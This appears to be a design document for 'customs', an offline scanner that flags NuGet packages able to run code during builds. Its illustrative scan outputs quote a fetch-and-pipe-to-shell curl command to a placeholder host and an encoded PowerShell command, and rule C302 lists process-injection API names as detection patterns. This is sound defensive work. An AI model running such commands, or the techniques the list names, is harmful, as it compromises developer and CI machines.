# customs design

This document is the contract. Code that disagrees with it is a bug in one of the two, and the fix says which.

customs never evaluates MSBuild and never loads an assembly. It reads the dependency graph that NuGet restore already resolved, from the lock file or the assets file, and inspects the files of each package as data. That is what lets it run without the .NET SDK, on any machine, on input an attacker wrote. It is also the source of most of its limits, which are listed under [What it cannot see](#what-it-cannot-see). See [ADR 0001](adr/0001-static-reading-only.md).

## The problem and who has it

A NuGet package can run code on the machine that restores and builds it:

| Where | When it runs | Source |
| --- | --- | --- |
| `.props` and `.targets` in `build/`, `buildMultitargeting/`, `buildTransitive/` | Every build of a project that references the package. MSBuild imports them automatically. | [NuGet docs, package folder conventions](https://learn.microsoft.com/en-us/nuget/create-packages/creating-a-package), read 2026-11-22 |
| Inline tasks (`UsingTask` with `CodeTaskFactory` or `RoslynCodeTaskFactory`) inside those files | At build time, compiled and run inside MSBuild. | [ReversingLabs, 2023-10-31](https://reversinglabs.com/blog/iamreboot-malicious-nuget-packages-exploit-msbuild-loophole) |
| Analyzers and source generators in `analyzers/` | At compile time, loaded into the compiler, and in the IDE. | [NuGet docs, controlling dependency assets](https://learn.microsoft.com/en-us/nuget/consume-packages/package-references-in-project-files), read 2026-11-22 |
| A module initialiser in any assembly | When the assembly loads, before any of its other code. | [ECMA-335 augments, dotnet/runtime](https://github.com/dotnet/runtime/blob/main/docs/design/specs/Ecma-335-Augments.md); [ReversingLabs, 2024-07-11](https://reversinglabs.com/blog/malicious-nuget-campaign-uses-homoglyphs-and-il-weaving-to-fool-devs) |
| PowerShell scripts in `tools/` | In Visual Studio's Package Manager Console. The older campaigns used `init.ps1`. | NuGet docs above; ReversingLabs 2023 above |
| Native binaries in `runtimes/*/native/` | When the application calls into them. | NuGet docs above |

The people who have this problem are .NET teams that accept dependency bumps from Dependabot or Renovate and build them in CI with secrets in the environment. They review the diff of a version number. Nothing in that diff says that the new version added a `buildTransitive` target that runs `curl`.

What they can do today:

- Write `ExcludeAssets` by hand on each `PackageReference` ([Meziantou](https://www.meziantou.net/limit-what-nuget-packages-can-do-in-your-project.htm), read 2026-11-22). This works, but only if they know which packages bring which assets.
- NuGetAudit, on by default, checks against the GitHub Advisory Database. It reports known vulnerabilities, not package contents ([Microsoft Learn](https://learn.microsoft.com/en-us/nuget/concepts/auditing-packages), read 2026-11-22).
- osv-scanner reads `packages.lock.json` and matches known IDs. It does not open packages.
- GuardDog inspects package contents for PyPI, npm, Go, RubyGems, GitHub Actions and VS Code extensions. Not NuGet ([README](https://github.com/DataDog/guarddog), read 2026-11-22).
- Socket has covered NuGet since a public beta on 2025-04-21, as a hosted service ([announcement](https://socket.dev/blog/introducing-net-support)).

customs is for the team that wants the answer locally, offline, in CI, without an account, and wants it to say what changed.

## Goals

1. List every package in a resolved graph that can run code at build time or at load time, and say how.
2. Report the specific constructs the published attacks used, at the file and line where they are.
3. On a version bump, report only what the new version adds.
4. Let a team accept the current state once, in a file they review, and then see only changes.
5. Never hide a gap. A scan that could not read a package, or stopped at a limit, says so and exits with its own code.
6. Treat every input as hostile and stay within stated limits of memory and time on any input.
7. Run with no network unless a download is needed for `diff`, and then only to nuget.org, and only if allowed.

## Non-goals

- Deciding whether a package is malicious. customs reports capabilities and constructs. A finding means "this runs on your machine", not "this is malware".
- Evaluating MSBuild, resolving properties or conditions, or running anything.
- Analysing method bodies of library code for malicious logic.
- Deobfuscation.
- A reputation service, a hosted database, telemetry, or an account.
- Changing the user's project, for example by writing `ExcludeAssets`. The report says which assets a package brings so a person can decide.
- `packages.config` projects. They have no lock or assets file of the kind read here.

## What it cannot see

This list goes into the README and the `--help` text. Each item has a test that pins the behaviour, so a change in what customs can see is a visible change.

- **Logic in ordinary library code.** The Socket case of 2025-11-06 hides sabotage in extension methods with date checks. The StripeApi.Net and Sicoob.Sdk cases of 2026 steal data from normal methods. customs reports none of this. A test builds a package in that shape and asserts that only inventory notes come out.
- **What a property expands to.** `<Exec Command="$(Cmd)" />` is reported as an `Exec` with the literal text `$(Cmd)`. A URL assembled from properties is not seen as a URL.
- **Which condition is true.** Every `Exec` is reported, also the ones whose `Condition` is false on this machine.
- **Obfuscation beyond the marker list.** A renamed or custom obfuscator passes. Markers are names in metadata, and an attacker can remove or fake them.
- **What a module initialiser does.** customs reports that one exists and how large its body is, not what it calls.
- **Native calls that are not a P/Invoke by name.** C302 matches the import name of a P/Invoke. A P/Invoke by ordinal (`EntryPoint = "#12"`), a function pointer from `NativeLibrary.GetExport`, and code that loads a library and looks up an export are not on the list; loading libraries is too common in benign packages (see C302).
- **Run-time behaviour.** Anything decided at run time: downloaded code, reflection, loading of other assemblies.
- **Packages outside the graph files.** MSBuild project SDKs (`<Project Sdk="Name/Version">`) and `dotnet tool` packages do not appear in `packages.lock.json` or in `project.assets.json`. `PackageDownload` items appear only in the assets file, so a scan of a lock file does not see them (open question 12). `contentFiles` source code, which is compiled into the user's assembly, is listed in the inventory but not inspected.
- **A cache that was changed after restore.** customs reads the extracted files in the global packages folder, which is what MSBuild imports. If something changed those files, customs reports the changed files, but it does not compare them against the original package unless asked to with `--verify-cache`.
- **Packages it cannot read.** These are reported as incomplete, never skipped silently.

## The user's view

One binary, `customs`, with three commands. Paths can be files or directories. A directory is searched for `packages.lock.json` and `obj/project.assets.json`, skipping `.git`, `bin` and `node_modules`.

### `customs scan`

```
customs scan [PATH...] [--packages-dir DIR] [--baseline FILE] [--write-baseline FILE]
             [--format text|json|sarif] [--output FILE] [--fail-on note|warning|error|never]
             [--verify-cache]
```

Inputs, detected by name and content:

- `packages.lock.json` (format versions 1 and 2): every package entry of type `Direct`, `Transitive` or `CentralTransitive`, for every target framework. `Project` entries are skipped. NuGet 7.6 added a format version 3 for projects whose target framework aliases resolve to the same framework ([PackagesLockFileFormat.cs](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.ProjectModel/ProjectLockFile/PackagesLockFileFormat.cs), read 2026-11-22). It has a different shape, and customs refuses it with exit 2 until a milestone reads it.
- `project.assets.json` (versions 3 and 4): every `libraries` entry of type `package`, and every `PackageDownload` item in `project.frameworks.*.downloadDependencies`. The package folders come from its `packageFolders`, in order. A relative folder, which NuGet never writes but the fixtures use, is taken from the directory of the assets file.
- A `.nupkg` file: that one package, read from the archive. The ID and version come from the `.nuspec` at the root of the archive, as NuGet reads them, through the same capped XML read as MSBuild files. The ID and the version are all the text inside `<id>` and `<version>`, joined and trimmed, so a comment inside them cuts nothing. Where they differ from the file name, the nuspec wins, because it is what NuGet uses, and no finding is raised. Otherwise they come from the file name (`contoso.tools.1.2.0.nupkg`), split at the first dot after which the rest is a valid version: when there is no nuspec, when it is not well-formed, when it is over the 8 MiB cap (a C002 gap) or cannot be read (a C001 gap), and when there is more than one `.nuspec` at the root (C003: NuGet reads only one, and which one is not customs's to guess). With a gap the package is not complete. The nuspec's bytes count in the package's budget.
- `--packages-dir DIR` alone: every package version in a global packages folder.

A package is looked up in `--packages-dir` first, if given. After that, for a lock file, in `NUGET_PACKAGES` if set, else `~/.nuget/packages` (`%USERPROFILE%\.nuget\packages` on Windows); for an assets file, in its `packageFolders`. A folder counts only if it holds `.nupkg.metadata`, which NuGet writes last when it extracts a package, or the `.nupkg.sha512` file that older versions wrote. A package that is in the graph and not on disk makes the scan incomplete. `scan` never downloads; run `dotnet restore` first.

The first draft of this section looked in `--packages-dir` last. A flag the user typed that is consulted only when the defaults fail would surprise them, so M1 changed the order.

Example, on a made-up package (illustrative, not real output):

```
$ customs scan src/Shop.Api/packages.lock.json
customs 0.1.0: 214 packages in 1 graph, all found

Contoso.Build.Tools 3.2.0  (transitive, via Contoso.Sdk)
  note     C101  build assets: buildTransitive/Contoso.Build.Tools.targets (+2 imported files)
  error    C201  inline task with RoslynCodeTaskFactory
                 buildTransitive/tasks/Fetch.targets:14  <UsingTask TaskName="Fetch" TaskFactory="RoslynCodeTaskFactory" ...>
  warning  C203  Exec
                 buildTransitive/tasks/Fetch.targets:31  Command="powershell -enc SQBFAFgA..."
  warning  C206  base64 string, 1,204 characters
                 buildTransitive/tasks/Fetch.targets:31

Contoso.Analyzers 1.0.4  (direct)
  note     C102  analyzer: analyzers/dotnet/cs/Contoso.Analyzers.dll
  error    C301  module initialiser in a build-time assembly (412 bytes of IL)
                 analyzers/dotnet/cs/Contoso.Analyzers.dll

2 errors, 2 warnings, 2 notes (3 more accepted by the baseline)
exit 1: findings at or above --fail-on warning
```

Text from packages is printed escaped: control characters, bidirectional overrides and non-printing characters are shown as `\u{...}`, and a backslash as `\\`. See [Security](#security-considerations).

Since M1 the first line reads `customs 0.1.0: 214 packages from 1 input, all complete`, or gives the number of gaps in place of "all complete". In text, a package with no finding and no gap is not listed; JSON lists every package.

`--write-baseline FILE` writes every current finding to a baseline file and exits 0. `--baseline FILE` hides findings whose fingerprint is in the file, and counts them.

`--verify-cache` also opens the `.nupkg` kept in each global packages folder entry, checks it against the hash in the lock or assets file, and reports any file whose extracted copy differs from the archive.

### `customs diff`

```
customs diff OLD NEW [--offline] [--cache-dir DIR] [--packages-dir DIR] [--baseline FILE]
                     [--format text|json|sarif] [--output FILE] [--fail-on ...]
```

`OLD` and `NEW` are two lock files or two assets files, typically the base branch and the pull request:

```
git show origin/main:src/Shop.Api/packages.lock.json > old.lock.json
customs diff old.lock.json src/Shop.Api/packages.lock.json --format sarif --output customs.sarif
```

For each package whose resolved version changed, and for each new package, customs scans the new version and, if there was one, the old version. It reports the findings of the new version whose fingerprints the old version does not have. A capability that is new, such as build assets in a package that had none, is raised from note to warning. Removed packages are not reported.

Each version is taken from the local package folders first. If it is not there and `--offline` is not given, it is downloaded from the nuget.org flat-container endpoint, `https://api.nuget.org/v3-flatcontainer/{id}/{version}/{id}.{version}.nupkg`, with the ID lowercased and the version normalised and lowercased ([Microsoft Learn](https://learn.microsoft.com/en-us/nuget/api/package-base-address-resource), read 2026-11-22; base URL confirmed in the service index on 2026-11-22). The download is checked against the content hash in the graph file before it is opened. It is kept in `--cache-dir`, default `customs-cache` under the system temporary directory, as the `.nupkg` file only; nothing is extracted to disk.

Example (illustrative):

```
$ customs diff old.lock.json packages.lock.json
customs 0.1.0: 3 packages changed (2 bumped, 1 added), 1 downloaded from nuget.org

Contoso.Http 4.1.0 -> 4.2.0
  warning  C101  new build assets: buildTransitive/Contoso.Http.targets
  warning  C203  new Exec
                 buildTransitive/Contoso.Http.targets:12  Command="curl -s https://example.invalid/i | sh"
  warning  C205  new URL
                 buildTransitive/Contoso.Http.targets:12  https://example.invalid/i

0 errors, 3 warnings, 0 notes
exit 1: findings at or above --fail-on warning
```

### `customs rules`

Prints the rule table below with IDs, default severities and one line each.

### Exit codes

| Code | Meaning |
| --- | --- |
| 0 | Scan complete, no finding at or above `--fail-on` outside the baseline. |
| 1 | At least one finding at or above `--fail-on` outside the baseline. |
| 2 | Usage error, or an input that could not be read as a graph at all. Nothing meaningful was scanned. |
| 3 | No finding at or above `--fail-on`, but the scan was incomplete: a package was missing, a download failed, or a limit stopped reading. |

Precedence is 2, then 1, then 3. `--fail-on` defaults to `warning`. `--fail-on never` always exits 0 or 2 or 3, for teams that only want the report. There is deliberately no flag that turns 3 into 0; a team that accepts a gap writes it into the baseline, where a reviewer sees it.

### Rules

Default severities are a starting point. The benign corpus decides the final ones before the first release, and any change is recorded here.

| ID | Severity | What |
| --- | --- | --- |
| C001 | (incomplete) | A package in the graph was not found on disk or could not be downloaded, or a part of it that a rule needs could not be read: an archive that is not a zip, an entry with a compression method other than stored or deflate, a file the system refuses to open. |
| C002 | (incomplete) | A limit stopped reading. The message names the limit and the file. |
| C003 | warning | An archive entry with `..`, an absolute path or a drive letter. The name is read as UTF-8 whatever the zip language flag says, then `%XX` escapes are decoded, then `\` is read as `/`, in that order, so `..%5Cx` is `../x`. Empty and `.` segments are dropped, as on extraction, not reported: a published package names entries `analyzers/cs//A.dll`. Also: a name whose bytes are not UTF-8, which readers decode in different code pages; a name with a control character (C0, DEL, C1), also one that comes from an escape such as `%00`; two entries whose names are equal ignoring case; two entries with the same name; an archive layout that zip readers could read differently (see [Limits](#limits)), which is not opened. In a package folder: a symbolic link or junction, not followed, anything that is not a regular file or a folder, and an ID or version folder that is itself a link, which is not read. The entry, or the package, is left out of the inventory, and a package not read is also a C001 gap. |
| C004 | warning | An MSBuild file that is not well-formed XML; has a DTD; is not valid UTF-8 or UTF-16; declares an encoding other than UTF-8, or, for a UTF-16 file, other than UTF-16; or has an XML declaration with no `?>`. The declaration is read to its `?>` wherever that is. A file over the node limit keeps its C004 beside the C002 gap. |
| C005 | error | A downloaded package, or a cached one with `--verify-cache`, does not match the content hash in the graph file. |
| C101 | note | Build assets: props or targets in `build/`, `buildTransitive/`, `buildMultitargeting/` or the old `buildCrossTargeting/`. |
| C102 | note | Analyzer or source generator assembly in `analyzers/`. |
| C103 | note | PowerShell script in `tools/`. |
| C104 | note | Native binary: a PE, ELF or Mach-O file that is not a managed assembly. C104 covers PE, ELF and Mach-O files in `runtimes/*/native/`, ELF and Mach-O files anywhere, and since M3, which reads the CLI header, a `.dll` or `.exe` under `build*/` or `tools/` that is native code, such as `tools/protoc.exe`. Native code under `lib/`, `ref/`, `runtimes/*/lib/` or `analyzers/`, where NuGet expects managed code, is C304 instead. The format comes from the first 64 bytes of the file. |
| C105 | note | `contentFiles` source code that will be compiled into the project. |
| C201 | error | `UsingTask` with a `TaskFactory`: `CodeTaskFactory`, `RoslynCodeTaskFactory` or any other, including one named through a property, except MSBuild's own `TaskHostFactory` and `AssemblyTaskFactory`, matched ignoring case as its `TaskRegistry` does. An empty `TaskFactory` counts as none. `UsingTask` is matched anywhere in the file, though MSBuild allows it only under `Project`: reporting more is the safe side. Those two run a compiled task assembly and compile nothing; C202 reports the assembly. The exception came from data: a scan of a local package cache on 2026-11-22 found 66 `TaskHostFactory` tasks in SDK packages, none in the corpus. Evidence: `TaskFactory="..." TaskName="..."`. |
| C202 | note | `UsingTask` with `AssemblyFile`: an assembly that MSBuild loads. That assembly gets the C3xx checks as build-time code. The path is often a property (Grpc.Tools 2.60.0 uses `$(_Protobuf_MsBuildAssembly)`), so every managed assembly under `build*/` or `tools/` is treated as build-time code too. Since M2 the inventory records them so: a `.dll` or `.exe` under `build*/` or `tools/`, and any file a literal `AssemblyFile` resolves to, is `managed` with the role `build_time`. A resolved file that is already `managed` (for example in `lib/`) becomes `build_time`; one classified as something else, such as an analyzer or a native binary, keeps that class; one not classified at all is added as `build_time`. Since M3 one under `build*/` or `tools/` that turns out to be native code is listed as `native` instead. |
| C203 | warning | `Exec` task: an element named `Exec` in any case, directly inside a `Target`, because MSBuild looks task names up ignoring case and an `Exec` outside a target is an item, not a task. Evidence: the `Command` attribute, its name matched ignoring case. |
| C204 | warning | `DownloadFile` task, matched as `Exec` is. Evidence: `SourceUrl`. |
| C205 | warning | A URL (`http`, `https`, `ftp`) in an attribute value or element text, CDATA included. Comments are ignored, and so are namespace declarations, which are not attributes. A URL assembled from properties (`$(Scheme)://$(Host)`) is not seen. Evidence: the URL. |
| C206 | warning | A base64-looking run of at least 200 characters, except a run of only hexadecimal digits of at most 1,024 characters: that is a key or a hash. The exception came from a local cache on 2026-11-22, where five strong-name public keys of 320 hex digits were the only C206 findings; the corpus has none. A longer hex run is as interesting as a base64 one and is reported. Evidence: the run, cut at 240 characters. |
| C207 | note | An `Import` that cannot be resolved inside the package. An `Import` with an `Sdk` attribute is not one: the SDK resolver finds it in that SDK, so it cannot reach a file of the package. The first M2 run reported 350 of those, all in workload manifest packages of the corpus, and left 8 that matter. Evidence: the `Project` attribute. |
| C301 | warning | Module initialiser: `<Module>`, the first `TypeDef` row, has a method named `.cctor` with `RTSpecialName`. Evidence: the size of its IL, or that its body cannot be read. |
| C302 | warning | P/Invoke whose import name is on the short list, matched ignoring ASCII case: functions that change memory protection or allocate executable memory (`VirtualProtect`, `VirtualProtectEx`, `VirtualAlloc`, `VirtualAlloc2`, `VirtualAllocEx`, `NtProtectVirtualMemory`, `ZwProtectVirtualMemory`, `NtAllocateVirtualMemory`, `ZwAllocateVirtualMemory`, `mprotect`) and functions that write to or start code in another process (`WriteProcessMemory`, `NtWriteVirtualMemory`, `ZwWriteVirtualMemory`, `CreateRemoteThread`, `CreateRemoteThreadEx`, `NtCreateThreadEx`, `ZwCreateThreadEx`, `RtlCreateUserThread`, `QueueUserAPC`, `NtQueueApcThread`, `SetThreadContext`, `NtSetContextThread`, `NtUnmapViewOfSection`, `ZwUnmapViewOfSection`, `process_vm_writev`). The import name, not the managed name, is matched, because it is what runs. The first draft listed dynamic loading too; the corpus showed `LoadLibrary`, `GetProcAddress`, `dlopen` or `dlsym` in 20 of the 300 packages, among them the build-time collector of coverlet.collector, which would have been an error, so they are not on the list. Evidence: `module!function`. At most 1,000 findings per assembly; past that one C002 gap. |
| C303 | note | Marker of a known obfuscator: a `TypeDef` or `TypeRef` with the namespace and name the obfuscator adds. The list has one marker, Dotfuscator's `DotfuscatorAttribute`; open question 10 says why. Evidence: the type name. |
| C304 | warning | A `.dll` or `.exe` where NuGet expects managed code (`lib/`, `ref/`, `runtimes/*/lib/`, `analyzers/`, or a task assembly that `UsingTask` names outside `build*/` and `tools/`) that is not a readable managed assembly: not a PE file, a native PE file, or a managed one whose headers or metadata cannot be read or could be read in more than one way (ADR 0006). Also a file under `build*/` or `tools/` that has a CLI header and cannot be read, or that is neither a PE, ELF nor Mach-O file. Evidence: the reason. |
| C401 | error | Package ID contains non-ASCII characters. |
| C402 | error | Package ID is a look-alike of a popular ID: same skeleton, different ID. |
| C403 | warning | Package ID is one edit, or only separators, away from a popular ID, and not itself popular. |

C3xx findings in a build-time assembly (an analyzer, an assembly named by `UsingTask`, or a managed assembly under `build*/` or `tools/`) are raised one step, because that code runs in the compiler or in MSBuild on every build: C301, C302 and C304 become errors, C303 a warning. The JSON `severity` of a finding is the raised one, and `--fail-on` compares against it.

### Output formats

- **text**: grouped by package, as above. Colour only on a terminal and unless `NO_COLOR` is set. M1 prints no colour at all.
- **json**: one object: `schema` (integer, starts at 1), `tool` (name, version), `inputs`, `packages` (ID, version, where it was read from, whether it is complete), `findings` (rule, severity, package, version, path, line, message, evidence, fingerprint, whether the baseline accepted it) and `incomplete`. Field names do not change within a schema version.

  Schema 1 as M1 writes it: `inputs` holds `path`, `kind` (`lock`, `assets`, `nupkg`, `packages_dir`, or null for a graph over the size limit) and `format_version`. Each of `packages` holds `id`, `version`, `dependency` (`direct`, `transitive`, `central_transitive`, `download`, or null for a `.nupkg` or a packages folder), `frameworks`, `source`, `complete`, `read` (`entries` listed and `bytes` read from entries, the budget of [Limits](#limits)) and `assets`, the inventory: every file that is not plain data, with its `path`, `kind` (`build`, `analyzer`, `powershell`, `native`, `managed`, `content_source`) and the kind's details. Each finding holds `rule`, `severity`, `package`, `version`, `path`, `line`, `message` and `evidence`; `line` and `evidence` are null for the inventory rules and C003. Each gap in `incomplete` holds `rule`, `input`, `package`, `version`, `path` and `message`. The fields `fingerprint` and `accepted` are added by M4; adding a field does not change the schema number. Since M2, a `managed` asset can have the role `build_time`.
- **Inventory findings** (C101 to C105) are one per rule and package: the path of the first file, an entry point first for C101, and how many more there are. The full list is in the JSON `assets`.
- **Assembly findings** (C301 to C304) are one per construct, on the assembly's path, with no line. In text a second line gives the path and the evidence.
- **MSBuild findings** (C004, C201 to C207) are one per construct, with the file and line. In text a second line gives `path:line` and the evidence, whitespace collapsed and cut at 100 characters. Line numbers are 1-based and count the lines of the decoded text, which for UTF-8 is the file as stored; `\n`, `\r\n` and a lone `\r` each end one line. A finding in element text or CDATA is at its own line; a finding in an attribute value is at the line where the value starts, because the XML parser normalises line breaks inside values. Every value from a file that goes into a message is cut at 240 characters, as evidence is. At most 1,000 findings are listed from one file, and at most 100 of them C207; past that the file gets one C002 gap that says how many more there were.
- **sarif**: SARIF 2.1.0 ([OASIS](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html)). One `run`, rules from the table above, `level` from the severity. The physical location is the graph file and the line of the package's entry in it, because that is the file in the user's repository; the path inside the package is in the message and in `properties`. Whether GitHub code scanning displays this well is an open question.

### Baseline file

```json
{
  "schema": 1,
  "accepted": [
    {
      "fingerprint": "5d0c6b0e9a3f41c2b8e7d1a4f6c9e2b7",
      "rule": "C203",
      "package": "Contoso.Build.Tools",
      "path": "buildTransitive/tasks/Fetch.targets",
      "note": ""
    }
  ]
}
```

Sorted by package, rule and path, so that a change to it reads well in a diff. `note` is for the reviewer and ignored by the tool. The fingerprint is defined in [ADR 0004](adr/0004-version-free-fingerprints.md): it does not include the version or the line, so a bump that changes nothing relevant stays accepted, and it does include the evidence, so a bump that changes the command does not.

## Architecture

One crate with a library and a thin binary. The library is pure where it can be; I/O sits at the edges.

```
inputs ─> graph ─> locate ─> package files ─> inventory ─> detectors ─> findings ─> baseline ─> report ─> exit code
          (pure)    (I/O)        (I/O,          (pure)       (pure)                   (pure)      (pure)
                                 limits)
                      └─> fetch (I/O, diff only)
```

### Modules

| Module | Does | I/O |
| --- | --- | --- |
| `cli` | Parses arguments, picks the command, maps the result to an exit code, writes the report. | stdout, files |
| `graph` | Parses lock and assets files into a `Graph`. Normalises IDs and versions. | none |
| `locate` | Finds each package: global packages folder, fallback folders, a single `.nupkg`, the download cache. | file system reads |
| `archive` | Reads a `.nupkg` through the `zip` crate: lists entries, reads one entry with caps. | file reads |
| `folder` | Lists an extracted package directory, without following links, and reads one file with caps. | file reads |
| `inventory` | Classifies package paths into assets. | none |
| `msbuild` | Rules C004 and C201 to C207 over the MSBuild files of a package; resolves literal imports between files of the package. | none |
| `xml` | Decoding as MSBuild does, the XML declaration, the DTD in the prolog, the table of line starts, and the nuspec identity. | none |
| `assembly` | PE headers through `object`; a minimal ECMA-335 metadata reader of its own; rules C301 to C304. | none |
| `names` | Rules C401 to C403 against the embedded list of popular IDs. | none |
| `fetch` | Downloads from the flat container and checks the hash. Behind the `fetch` cargo feature, on by default. | network, cache directory |
| `hash` | NuGet content hash of a `.nupkg`, including the variant for signed packages. | none |
| `baseline` | Reads and writes the baseline, filters findings. | none (the caller reads the file) |
| `report` | Text, JSON and SARIF writers into any `Write`. Escaping of untrusted text. | none |

`archive` and `folder` give `inventory` and the detectors the same view: a list of entries (normalised path, size) and a function that reads one entry up to a cap. Detectors receive bytes or `&str`, never paths on disk.

### Main types

- `PackageId`: the ID as written, with comparison and hashing on the lowercase form, as NuGet compares IDs case-insensitively.
- `PackageVersion`: the version as written, plus its NuGet normalised form (no build metadata, no trailing `.0` fourth part, no leading zeros), which names the folder and the download URL.
- `PackageRef`: ID, version, direct or transitive, target frameworks, content hash if the graph file has one.
- `PackagePath`: a path inside a package with `/` separators, checked once at construction (no `..`, not absolute). Folder matching is case-insensitive.
- `Asset`: `Build { folder, entry_point }`, `Analyzer`, `PowerShell`, `Native { format }`, `Managed { role }`, `ContentSource`, `Other`.
- `Finding`: rule, severity, package, version, path, line, message, evidence, fingerprint.
- `Severity`: `Note < Warning < Error`. Incomplete results are a separate type, `Gap`, not a severity, so they cannot be filtered away by `--fail-on`.
- `Limits`: all the caps below in one value, passed down explicitly. Tests run with small limits to reach them cheaply.
- `Scan`: packages, findings and gaps. `diff` is a function of two `Scan` values plus the two graphs.

### Limits

Starting values. Each has a test with an input just over it. Reaching one produces a C002 gap, never a crash and never silence; since the M2 review that includes the nuspec of a `.nupkg`.

| Limit | Value |
| --- | --- |
| Graph file size | 64 MiB |
| `.nupkg` size | 1 GiB |
| Entries in one package | 50,000 |
| Central directory of one archive | 64 MiB |
| Path length in a package | 1,024 bytes, 64 segments |
| Bytes read from one entry | 8 MiB for MSBuild files and the nuspec, 256 MiB for assemblies, 64 bytes for native-binary detection |
| Decompression ratio while reading an entry | 200 to 1 |
| Total bytes read per package | 512 MiB |
| XML nodes per document | 200,000 (roxmltree `nodes_limit`) |
| Findings listed from one MSBuild file or one assembly | 1,000; of an MSBuild file's, at most 100 C207 |
| Findings of the MSBuild and assembly rules listed for one package | 10,000 |
| Metadata table rows | 16,777,215 (2^24 - 1) per table, as a token row index has 24 bits |
| Download size | 1 GiB, with a 60 second timeout |

The assembly cap was 128 MiB until the first corpus run of M3: `lib/EO.WebEngine.dll` in EO.WebBrowser 26.3.58 is 169,275,808 bytes. 256 MiB keeps one such assembly well inside the 512 MiB budget of its package.

The findings limit per package came from data on 2026-11-25: the most findings of the MSBuild and assembly rules (C004, C2xx, C3xx) in one package were 73 in a local cache of 4,422 package versions (Microsoft.DotNet.Arcade.Sdk 12.0.0-beta.26477.101) and 11 in the benign corpus (Microsoft.VisualStudio.Azure.Containers.Tools.Targets 1.23.0). 10,000 is more than a hundred times the largest. It counts every finding the package already has when an MSBuild or assembly finding is added, C003 included; the inventory's own notes, at most one per entry, come after and are not counted. Past it, one C002 gap on the package gives the number not listed.

Entries that no rule needs to read, such as documentation, images and large native files, are listed by name and size and never decompressed. That keeps a scan of a graph with large runtime packages cheap.

How M1 applies them:

- **What is read.** Since M2, every `.props`, `.targets` and `.tasks` file, and the nuspec of a single `.nupkg`, up to 8 MiB each; over the cap is a C002 gap. Otherwise only the first 64 bytes of an entry, to tell PE, ELF and Mach-O apart. It reads the entries in `runtimes/*/native/` and every entry that is not classified by its path and whose extension is not on a short list of data types (text, XML, JSON, Markdown, images, PDB, signatures, MSBuild and source files).
- **Layout.** The `zip` crate allocates for every entry the central directory declares, and it searches for the directory in ways customs cannot predict: it scans back for end records and searches for a zip64 record that ends at its locator. So customs does not try to predict it. Before the crate sees the file, customs accepts only the canonical layout: the end record is the last end-record signature in the last 66,581 bytes, a window larger than the one the crate searches (65,536 bytes plus the size of a record), its comment runs exactly to the end of the file, and no earlier record there also ends the file; one disk; without zip64, the central directory ends exactly where the end record begins; with zip64 (a locator right before the end record, whether or not the classic record has a 0xFFFF field, because the crate looks for a locator in front of every end record), the locator points at a zip64 record, that record ends exactly where the locator begins, and the central directory ends exactly where the zip64 record begins; and a central directory header is where the directory begins. Then the entry count, from the zip64 record if there is one, must be at most 50,000, and the directory at most 64 MiB; over either is a C002 gap. Any other layout, such as junk in front that makes the offsets not add up, a locator that points elsewhere, or an end-record signature in the comment, is C003 and the archive is not opened. Because the directory abuts its end record, the crate does not fall back to an earlier one when it fails, so what customs checked is what the crate parses. On 2026-11-22 this refused none of the `.nupkg` files in a local cache (see the M1 progress entry in the roadmap).
- **Folders.** A package folder is walked until the 50,001st child, files, folders and links together, counted as each is listed, so a folder of empty folders stops at the limit too.
- **Ratio.** An entry whose declared size is more than 200 times its compressed size is not read. Otherwise the read is allowed the cap or 200 times the compressed size, whichever is smaller, and one byte more to see whether the entry goes on; more bytes out than 200 times the compressed size is a C002 gap. The compressed size is the header's. The zip crate never reads more compressed bytes than it, and one that is overstated is still bounded by the bytes really in the file.
- **The budget.** Every entry listed and every byte read from an entry is counted per package, and a read that would pass 512 MiB is refused before it starts. The JSON report shows the count as `read`. The tests assert it: the zip bomb and the 50,001-entry archive end with 0 bytes read, and the archive whose header understates its size ends with at most 64.
- **Measured on 2026-11-22**, over the 4,393 `.nupkg` files in a local cache: at most 2,051 entries in one package, no entry above 200 to 1, only stored and deflate entries, and 394 entry names with `%XX` escapes. The limits leave room for real packages.

customs forbids `unsafe`, so it cannot install a counting global allocator to measure peak memory. The test asserts what the code controls: the bytes it reads and the entries it lists.

## The hard parts

### Hostile archives and files

Zip bombs, path traversal and absurd entry counts are handled by the limits above and by never writing package content to disk. Entry names are only used to classify, never to open a file. Reads go through a counting reader that stops at the cap and at the compression ratio, whatever the header claims. XML is parsed by roxmltree with DTDs off (its default) and a node limit; a DTD is reported as C004 rather than parsed. Assembly reading bounds-checks every offset and size against the slice it came from, with checked arithmetic, and every table index against the row count.

### Agreeing with NuGet about what is in a package

If customs and NuGet disagree about the files in a package, an attacker can show customs one thing and MSBuild another. Four choices reduce that:

1. When a package is in the global packages folder, customs reads the extracted files, because those are the files MSBuild imports. It reads the archive only for a `.nupkg` input and for downloads in `diff`. See [ADR 0005](adr/0005-read-what-msbuild-imports.md).
2. Folder names are matched case-insensitively (`Build/`, `BUILD/`), and entries whose names collide ignoring case are reported (C003). The folder names are ASCII literals, which NuGet compares with `OrdinalIgnoreCase`; for an ASCII literal that is an ASCII case-insensitive comparison, and customs uses exactly that. `buıld/` with a dotless i is not a build folder: .NET's `string.Equals("buıld", "BUILD", StringComparison.OrdinalIgnoreCase)` is false (checked with .NET 11 during the M1 review). Case collisions use a wider comparison, one character to one by the simple upper-case mapping. It also flags pairs that NTFS would not merge, such as `ı` and `I` or `ſ` and `S`; a warning that is slightly too wide is the right side to err on.
3. Package IDs name their folders in lowercase. NuGet uses `ToLowerInvariant`, which works character by character; customs does the same, with no final-sigma rule, and keeps a character whose Rust lowercase is more than one character. .NET maps some of those, such as `İ`, to one character, so such an ID may be looked up in the wrong folder. It then shows as C001, a visible gap, not a silent miss. Open question 15 tracks this for M4.
4. With `--verify-cache`, the cached archive is compared with the extracted files and with the graph's hash.

What remains: the `zip` crate and .NET's `System.IO.Compression` may disagree on malformed archives, for example data before the first entry, two end-of-central-directory records, or a local header that contradicts the central directory. M6 builds such archives and records what each reader does. Where they disagree, customs reports the archive as C003 instead of choosing. For the layout of the central directory this is already so since M1: an archive whose end records zip readers could pick differently is C003 and not opened (see [Limits](#limits)). The M1 review showed why: a first version counted entries in the end records it found, and an archive with junk in front and a zip64 record away from its locator made the crate parse 2,000,000 entries in 424 MB while customs counted one.

### MSBuild without evaluation

